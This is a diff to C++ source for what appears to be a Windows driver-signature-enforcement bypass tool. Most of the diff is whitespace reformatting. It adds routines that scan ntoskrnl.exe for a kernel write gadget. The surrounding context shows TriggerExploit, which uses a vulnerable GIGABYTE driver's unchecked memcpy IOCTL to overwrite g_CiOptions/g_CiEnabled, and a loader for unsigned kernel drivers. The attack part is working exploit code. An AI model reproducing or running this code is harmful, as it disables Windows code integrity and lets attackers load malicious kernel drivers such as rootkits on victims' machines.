@@ -18,7 +18,7 @@ typedef struct _GIOMemcpyInput
 	ULONG_PTR Dst;
 	ULONG_PTR Src;
 	ULONG Size;
-} GIOMemcpyInput, *PGIOMemcpyInput;
+} GIOMemcpyInput, * PGIOMemcpyInput;
 
 static WCHAR DriverServiceName[MAX_PATH], LoaderServiceName[MAX_PATH];
 
@@ -27,7 +27,7 @@ NTSTATUS
 FindKernelModule(
 	_In_ PCCH ModuleName,
 	_Out_ PULONG_PTR ModuleBase
-	)
+)
 {
 	*ModuleBase = 0;
 
@@ -35,12 +35,12 @@ FindKernelModule(
 	NTSTATUS Status;
 	if ((Status = NtQuerySystemInformation(SystemModuleInformation, nullptr, 0, &Size)) != STATUS_INFO_LENGTH_MISMATCH)
 		return Status;
-	
+
 	const PRTL_PROCESS_MODULES Modules = static_cast<PRTL_PROCESS_MODULES>(RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, 2 * static_cast<SIZE_T>(Size)));
 	Status = NtQuerySystemInformation(SystemModuleInformation,
-										Modules,
-										2 * Size,
-										nullptr);
+		Modules,
+		2 * Size,
+		nullptr);
 	if (!NT_SUCCESS(Status))
 		goto Exit;
 
@@ -68,7 +68,7 @@ QueryCiEnabled(
 	_In_ SIZE_T SizeOfImage,
 	_In_ ULONG_PTR KernelBase,
 	_Out_ PULONG_PTR gCiEnabledAddress
-	)
+)
 {
 	*gCiEnabledAddress = 0;
 
@@ -85,6 +85,39 @@ QueryCiEnabled(
 	return Rel;
 }
 
+void FindWriteGadget(_In_ PVOID MappedBase)
+{
+	const PUCHAR FsRtlInitializeFileLock = reinterpret_cast<PUCHAR>(GetProcedureAddress(reinterpret_cast<ULONG_PTR>(MappedBase), "FsRtlInitializeFileLock"));
+
+	if (FsRtlInitializeFileLock == nullptr)
+		return;
+
+	Printf(L"FsRtlInitializeFileLock: %p\n", FsRtlInitializeFileLock);
+
+	LONG Rel = 0;
+	hde64s hs;
+	ULONG c = 0;
+	ULONG j = 0;
+	do
+	{
+		if (*reinterpret_cast<PUSHORT>(FsRtlInitializeFileLock + c) == 0x118948) // MOV qword ptr [RCX],RDX - 48 89 11
+		{
+			Rel = *reinterpret_cast<PLONG>(FsRtlInitializeFileLock + c);
+			break;
+		}
+		hde64_disasm(FsRtlInitializeFileLock + c, &hs);
+		if (hs.flags & F_ERROR)
+			break;
+		c += hs.len;
+
+	} while (c < 256);
+
+	const PUCHAR mov = FsRtlInitializeFileLock + Rel + 2;
+
+	Printf(L"ntBase:                  %p\n", MappedBase);
+	Printf(L"\n\n>>>>>>>>>>> Offset asm mov: %p\n", (mov - MappedBase));
+}
+
 // For Windows 8 and worse
 static
 LONG
@@ -92,7 +125,7 @@ QueryCiOptions(
 	_In_ PVOID MappedBase,
 	_In_ ULONG_PTR KernelBase,
 	_Out_ PULONG_PTR gCiOptionsAddress
-	)
+)
 {
 	*gCiOptionsAddress = 0;
 
@@ -170,18 +203,47 @@ QueryCiOptions(
 
 	*gCiOptionsAddress = KernelBase + MappedCiOptions - static_cast<PUCHAR>(MappedBase);
 
-	Printf(L"MappedBase:      %p\n", MappedBase);
+	Printf(L"CiBase:          %p\n", MappedBase);
 	Printf(L"MappedCiOptions: %p\n", MappedCiOptions);
-	Printf(L">>>>>>>>>>> Offset CiOptions: %p\n", (MappedCiOptions - MappedBase));
-		
+	Printf(L"\n\n>>>>>>>>>>> Offset CiOptions: %p\n", (MappedCiOptions - MappedBase));
+
 	return Rel;
+}
+
+void GetWriteGadget()
+{
+	WCHAR Path[MAX_PATH];
+	const CHAR NtoskrnlExe[] = "ntoskrnl.exe";
+	_snwprintf(Path, MAX_PATH / sizeof(WCHAR), L"%ls\\System32\\%hs", SharedUserData->NtSystemRoot, NtoskrnlExe);
+
+	PVOID MappedBase;
+	SIZE_T ViewSize;
+	NTSTATUS Status = MapFileSectionView(Path, FALSE, &MappedBase, &ViewSize);
+	if (!NT_SUCCESS(Status))
+	{
+		Printf(L"Failed to map %ls: %08X\n", Path, Status);
+		return;
+	}
+
+	ULONG_PTR KernelBase;
+	Status = FindKernelModule(NtoskrnlExe, &KernelBase);
+	if (!NT_SUCCESS(Status)) {
+		Printf(L"Failed to FindKernelModule");
+		goto Exit;
+	}
+
+	FindWriteGadget(MappedBase);
+
+Exit:
+	NtUnmapViewOfSection(NtCurrentProcess, MappedBase);
+	return;
 }
 
 static
 NTSTATUS
 AnalyzeCi(
-	_Out_ PVOID *CiOptionsAddress
-	)
+	_Out_ PVOID* CiOptionsAddress
+)
 {
 	*CiOptionsAddress = nullptr;
 
@@ -243,7 +305,7 @@ AnalyzeCi(
 			Status = STATUS_NOT_FOUND;
 		}
 	}
-	
+
 Exit:
 	NtUnmapViewOfSection(NtCurrentProcess, MappedBase);
 	return Status;
@@ -281,20 +343,20 @@ static NTSTATUS CreateDriverService(PWCHAR ServiceName, PWCHAR FileName)
 	ULONG ServiceType = SERVICE_KERNEL_DRIVER;
 
 	Status = RtlWriteRegistryValue(RTL_REGISTRY_ABSOLUTE,
-									ServiceName,
-									L"ImagePath",
-									REG_SZ,
-									NtPath,
-									ConvertToNtPath(NtPath, FileName));
+		ServiceName,
+		L"ImagePath",
+		REG_SZ,
+		NtPath,
+		ConvertToNtPath(NtPath, FileName));
 	if (!NT_SUCCESS(Status))
 		return Status;
 
 	Status = RtlWriteRegistryValue(RTL_REGISTRY_ABSOLUTE,
-									ServiceName,
-									L"Type",
-									REG_DWORD,
-									&ServiceType,
-									sizeof(ServiceType));
+		ServiceName,
+		L"Type",
+		REG_DWORD,
+		&ServiceType,
+		sizeof(ServiceType));
 	return Status;
 }
 
@@ -308,9 +370,9 @@ static BOOLEAN IsCiEnabled()
 {
 	SYSTEM_CODEINTEGRITY_INFORMATION CiInfo = { sizeof(SYSTEM_CODEINTEGRITY_INFORMATION) };
 	const NTSTATUS Status = NtQuerySystemInformation(SystemCodeIntegrityInformation,
-													&CiInfo,
-													sizeof(CiInfo),
-													nullptr);
+		&CiInfo,
+		sizeof(CiInfo),
+		nullptr);
 	if (!NT_SUCCESS(Status))
 		Printf(L"Failed to query code integrity status: %08X\n", Status);
 
@@ -337,23 +399,23 @@ NTSTATUS
 OpenDeviceHandle(
 	_Out_ PHANDLE DeviceHandle,
 	_In_ BOOLEAN PrintErrors
-	)
+)
 {
 	UNICODE_STRING DeviceName = RTL_CONSTANT_STRING(GIO_DEVICE_NAME);
 	OBJECT_ATTRIBUTES ObjectAttributes = RTL_CONSTANT_OBJECT_ATTRIBUTES(&DeviceName, OBJ_CASE_INSENSITIVE);
 	IO_STATUS_BLOCK IoStatusBlock;
 
 	const NTSTATUS Status = NtCreateFile(DeviceHandle,
-										SYNCHRONIZE, // Yes, these really are the only access rights needed. (actually would be 0, but we want SYNCHRONIZE to wait on NtDeviceIoControlFile)
-										&ObjectAttributes,
-										&IoStatusBlock,
-										nullptr,
-										FILE_ATTRIBUTE_NORMAL,
-										FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
-										FILE_OPEN,
-										FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE,
-										nullptr,
-										0);
+		SYNCHRONIZE, // Yes, these really are the only access rights needed. (actually would be 0, but we want SYNCHRONIZE to wait on NtDeviceIoControlFile)
+		&ObjectAttributes,
+		&IoStatusBlock,
+		nullptr,
+		FILE_ATTRIBUTE_NORMAL,
+		FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
+		FILE_OPEN,
+		FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE,
+		nullptr,
+		0);
 
 	if (!NT_SUCCESS(Status) && PrintErrors) // The first open is expected to fail; don't spam the user about it
 		Printf(L"Failed to obtain handle to device %wZ: NtCreateFile: %08X.\n", &DeviceName, Status);
@@ -368,7 +430,7 @@ TriggerExploit(
 	_In_ PVOID CiVariableAddress,
 	_In_ ULONG CiOptionsValue,
 	_Out_opt_ PULONG OldCiOptionsValue
-	)
+)
 {
 	if (OldCiOptionsValue != nullptr)
 		*OldCiOptionsValue = 0;
@@ -395,7 +457,7 @@ TriggerExploit(
 	// Number of bytes to read/write: 1 on Windows 7, 4 on lesser OSes
 	const ULONG CiPatchSize = NtCurrentPeb()->OSBuildNumber >= 9200 ? sizeof(ULONG) : sizeof(UCHAR);
 	const UCHAR CiOptionsValueByte = static_cast<UCHAR>(CiOptionsValue);
-	
+
 	GIOMemcpyInput MemcpyInput;
 	IO_STATUS_BLOCK IoStatusBlock;
 
@@ -409,15 +471,15 @@ TriggerExploit(
 
 		// IOCTL (1): Read the current value of g_CiEnabled/g_CiOptions so we can restore it later
 		Status = NtDeviceIoControlFile(DeviceHandle,
-										nullptr,
-										nullptr,
-										nullptr,
-										&IoStatusBlock,
-										IOCTL_GIO_MEMCPY,
-										&MemcpyInput,
-										sizeof(MemcpyInput),
-										nullptr,
-										0);
+			nullptr,
+			nullptr,
+			nullptr,
+			&IoStatusBlock,
+			IOCTL_GIO_MEMCPY,
+			&MemcpyInput,
+			sizeof(MemcpyInput),
+			nullptr,
+			0);
 		if (!NT_SUCCESS(Status))
 		{
 			Printf(L"NtDeviceIoControlFile(IOCTL_GIO_MEMCPY) *READ* failed: error %08X\n", Status);
@@ -438,15 +500,15 @@ TriggerExploit(
 	// IOCTL (2): Use the driver IOCTL's juicy memcpy that performs zero access checks to write the desired value to the kernel address
 	RtlZeroMemory(&IoStatusBlock, sizeof(IoStatusBlock));
 	Status = NtDeviceIoControlFile(DeviceHandle,
-									nullptr,
-									nullptr,
-									nullptr,
-									&IoStatusBlock,
-									IOCTL_GIO_MEMCPY,
-									&MemcpyInput,
-									sizeof(MemcpyInput),
-									nullptr,
-									0);
+		nullptr,
+		nullptr,
+		nullptr,
+		&IoStatusBlock,
+		IOCTL_GIO_MEMCPY,
+		&MemcpyInput,
+		sizeof(MemcpyInput),
+		nullptr,
+		0);
 	if (!NT_SUCCESS(Status))
 		Printf(L"NtDeviceIoControlFile(IOCTL_GIO_MEMCPY) *WRITE* failed: error %08X\n", Status);
 
@@ -461,7 +523,7 @@ WindLoadDriver(
 	_In_ PWCHAR LoaderName,
 	_In_ PWCHAR DriverName,
 	_In_ BOOLEAN Hidden
-	)
+)
 {
 	WCHAR LoaderPath[MAX_PATH], DriverPath[MAX_PATH];
 
@@ -477,9 +539,9 @@ WindLoadDriver(
 	CONSTEXPR CONST ULONG SE_LOAD_DRIVER_PRIVILEGE = 10UL;
 	BOOLEAN SeLoadDriverWasEnabled;
 	Status = RtlAdjustPrivilege(SE_LOAD_DRIVER_PRIVILEGE,
-								TRUE,
-								FALSE,
-								&SeLoadDriverWasEnabled);
+		TRUE,
+		FALSE,
+		&SeLoadDriverWasEnabled);
 	if (!NT_SUCCESS(Status))
 	{
 		Printf(L"Fatal error: failed to acquire SE_LOAD_DRIVER_PRIVILEGE. Make sure you are running as administrator.\n");
@@ -576,9 +638,9 @@ Exit:
 
 	// Revert privileges
 	RtlAdjustPrivilege(SE_LOAD_DRIVER_PRIVILEGE,
-						SeLoadDriverWasEnabled,
-						FALSE,
-						&SeLoadDriverWasEnabled);
+		SeLoadDriverWasEnabled,
+		FALSE,
+		&SeLoadDriverWasEnabled);
 
 	return Status;
 }
@@ -587,14 +649,14 @@ NTSTATUS
 WindUnloadDriver(
 	_In_ PWCHAR DriverName,
 	_In_ BOOLEAN Hidden
-	)
+)
 {
 	CONSTEXPR CONST ULONG SE_LOAD_DRIVER_PRIVILEGE = 10UL;
 	BOOLEAN SeLoadDriverWasEnabled;
 	NTSTATUS Status = RtlAdjustPrivilege(SE_LOAD_DRIVER_PRIVILEGE,
-										TRUE,
-										FALSE,
-										&SeLoadDriverWasEnabled);
+		TRUE,
+		FALSE,
+		&SeLoadDriverWasEnabled);
 	if (!NT_SUCCESS(Status))
 		return Status;
 
@@ -608,9 +670,9 @@ WindUnloadDriver(
 		DeleteService(DriverServiceName);
 
 	RtlAdjustPrivilege(SE_LOAD_DRIVER_PRIVILEGE,
-						SeLoadDriverWasEnabled,
-						FALSE,
-						&SeLoadDriverWasEnabled);
+		SeLoadDriverWasEnabled,
+		FALSE,
+		&SeLoadDriverWasEnabled);
 
 	return Status;
 }
@@ -619,4 +681,6 @@ WindUnloadDriver(
 void CIInfo() {
 	PVOID CiOptionsAddress;
 	AnalyzeCi(&CiOptionsAddress);
+	Printf(L"\n\n");
+	GetWriteGadget();
 }
